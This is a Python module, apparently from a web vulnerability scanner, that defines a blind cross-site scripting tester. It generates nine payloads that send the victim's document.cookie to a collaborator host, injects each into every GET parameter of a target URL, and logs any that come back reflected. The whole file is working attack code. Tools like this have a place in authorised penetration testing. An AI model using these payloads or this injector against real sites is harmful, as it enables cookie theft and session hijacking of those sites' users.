#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import threading
import time
import hashlib
import random
import string
from core.logger import log_info, log_success, log_warning, log_error, log_debug

class BlindXSSCollaborator:
    def __init__(self, target, verbose=False):
        self.target = target.rstrip('/')
        self.verbose = verbose
        self.payloads = []
        self.collaborator_id = self.generate_id()
        self.results = []

    def generate_id(self):
        """Generate a unique collaborator ID"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

    def generate_payloads(self):
        """Generate blind XSS payloads with collaborator ID"""
        base_payloads = [
            f"<script>fetch('https://collaborator.example.com/{self.collaborator_id}?c='+document.cookie)</script>",
            f"<img src=x onerror=fetch('https://collaborator.example.com/{self.collaborator_id}?c='+document.cookie)>",
            f"<script>new Image().src='https://collaborator.example.com/{self.collaborator_id}?c='+document.cookie</script>",
            f"<svg/onload=fetch('https://collaborator.example.com/{self.collaborator_id}?c='+document.cookie)>",
            f"<body/onload=fetch('https://collaborator.example.com/{self.collaborator_id}?c='+document.cookie)>",
            f"<script>document.location='https://collaborator.example.com/{self.collaborator_id}?c='+document.cookie</script>",
            f"<iframe src='javascript:fetch(\\\"https://collaborator.example.com/{self.collaborator_id}?c=\\\"+document.cookie)'></iframe>",
            f"<input/onfocus=fetch('https://collaborator.example.com/{self.collaborator_id}?c='+document.cookie)>",
            f"<script>navigator.sendBeacon('https://collaborator.example.com/{self.collaborator_id}', document.cookie)</script>"
        ]
        self.payloads = base_payloads

    def inject_payload(self, url, param, payload):
        """Inject payload into URL parameter"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def test_blind_xss(self):
        """Test for blind XSS vulnerabilities"""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        
        if not params:
            log_warning("No GET parameters found for blind XSS testing")
            return

        self.generate_payloads()
        log_info(f"Testing {len(params)} parameters with {len(self.payloads)} blind XSS payloads...")

        for param in params.keys():
            log_info(f"Testing parameter: {param}")
            for payload in self.payloads:
                test_url = self.inject_payload(self.target, param, payload)
                try:
                    resp = requests.get(test_url, timeout=10, allow_redirects=False)
                    # Check if payload is reflected (for testing purposes)
                    if payload in resp.text or payload.replace('<', '&lt;').replace('>', '&gt;') in resp.text:
                        result = {
                            "param": param,
                            "payload": payload,
                            "url": test_url,
                            "collaborator_id": self.collaborator_id,
                            "status": "reflected"
                        }
                        self.results.append(result)
                        log_success(f"🔥 Blind XSS payload reflected on {param}")
                        log_success(f"   Collaborator ID: {self.collaborator_id}")
                        break
                    elif self.verbose:
                        log_debug(f"Payload not reflected on {param}")
                except Exception as e:
                    if self.verbose:
                        log_debug(f"Error testing {param}: {e}")

    def run(self):
        log_info(f"Starting Blind XSS scan on: {self.target}")
        log_info(f"Collaborator ID: {self.collaborator_id}")
        log_info("Use: https://collaborator.example.com/ or https://xsshunter.com/ to check for hits")
        
        self.test_blind_xss()
        
        log_success(f"Blind XSS scan completed. Found {len(self.results)} potential vulnerabilities.")
        return {
            "target": self.target,
            "scan_type": "blind_xss",
            "collaborator_id": self.collaborator_id,
            "total_found": len(self.results),
            "results": self.results
        }
